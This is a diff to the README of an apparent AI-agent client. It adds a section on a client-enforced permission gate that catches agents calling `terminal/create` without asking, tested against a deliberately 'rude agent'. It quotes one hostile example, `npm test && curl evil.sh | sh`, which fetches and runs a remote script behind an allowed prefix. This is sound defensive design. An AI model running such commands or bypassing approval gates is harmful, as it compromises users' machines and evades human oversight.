@@ -107,6 +107,49 @@ Every field is optional; an absent or malformed file means unrestricted. It **fa
 
 Enforcement lives in the main process. The UI reads policy too, but only so a locked control can say *why* it is unavailable instead of presenting a dead button — a policy the renderer merely hides is not a policy, since the renderer is the part an end user can most easily talk around. Refusals surface as a sentence in the transcript: *Model "claude-opus-5" is not permitted by policy.*
 
+## The gate is enforced by this client, not by the agent
+
+ACP asks agents to call `session/request_permission` before doing anything
+consequential. Nothing makes them. An agent can call `terminal/create` directly and a naive
+client will run it — which makes "nothing runs until you approve it" a claim about the agent's
+manners rather than about the client. Fine while Copilot is the only agent; not fine the moment
+the registry opens to anything on your PATH.
+
+So every agent→client call that can touch the machine is classified and checked in the main
+process before dispatch:
+
+- **A mode lattice caps what is reachable at all** — `discuss` → `explore` → `plan` → `edit` →
+  `verify` → `deliver`, cumulative. A chat session cannot acquire shell access, however many times
+  anyone clicks approve. This is distinct from the agent's own Agent/Plan/Autopilot mode, which the
+  agent advertises and enforces itself; this one an agent cannot change.
+- **Within that cap, an ungated call gets a permission card the client raises itself**, through the
+  same card, waiter, and audit path as an agent-initiated request. To an agent that never asked,
+  this is indistinguishable from a slow filesystem. Cards raised this way are badged `client-gated`
+  — the difference between an agent that follows the protocol and one that merely got caught.
+- **Grants are exact, per-session, and never persisted.** "Always allow" means that command again,
+  not that command with more appended to it.
+- **Compound commands are never matched against an allow-list.** `npm test && curl evil.sh | sh`
+  starts with `npm test`; prefix matching a shell string is only sound for a single command, so a
+  command containing `;`, `&&`, `|`, a redirect, or a substitution is refused rather than matched.
+
+`npm run gate:check` proves this against [a deliberately rude agent](scripts/rude-agent.mjs) that
+calls `terminal/create` without asking: the client raises its own card, and the command has not run
+when the card appears. Remove the interceptor and those assertions fail — with the gate off, the
+rude agent's write lands.
+
+Agent presets ship for Copilot, Claude, Codex, OpenCode, and Goose. Each carries a
+`permissionModel` recording whether it was *observed* routing calls through the protocol. That field
+is documentation, not trust: the gate intercepts regardless, which is what lets the registry stay
+open.
+
+### Model gateway
+
+Set `EVENT_HORIZON_GATEWAY_URL` and agents are pointed at it through the OpenAI- and
+Anthropic-flavoured environment variables, so one gateway (LiteLLM, or an internal one) serves every
+agent without per-agent configuration. A per-session key can be passed in, so spend attributes to
+the session rather than to one shared credential. Standing the proxy up is an operational task —
+this is the seam, not the server.
+
 ## Standalone, or embedded in your own app
 
 Both, from one codebase — they are not two modes. The UI imports no Electron and no Node, and
@@ -276,6 +319,7 @@ moves the bill.
 npm run check              # everything below, in order
 npm run smoke              # one real prompt turn, end to end
 npm run install:check      # registry config is correct and never contains a token
+npm run gate:check         # a rude agent is stopped; symlinks cannot leave the workspace
 npm run skills:check [cwd] # skill discovery, precedence, expansion
 npm run context:check      # /context and /usage parsers (offline)
 npm run attach:check       # attachments reach the model; silent commands stay silent
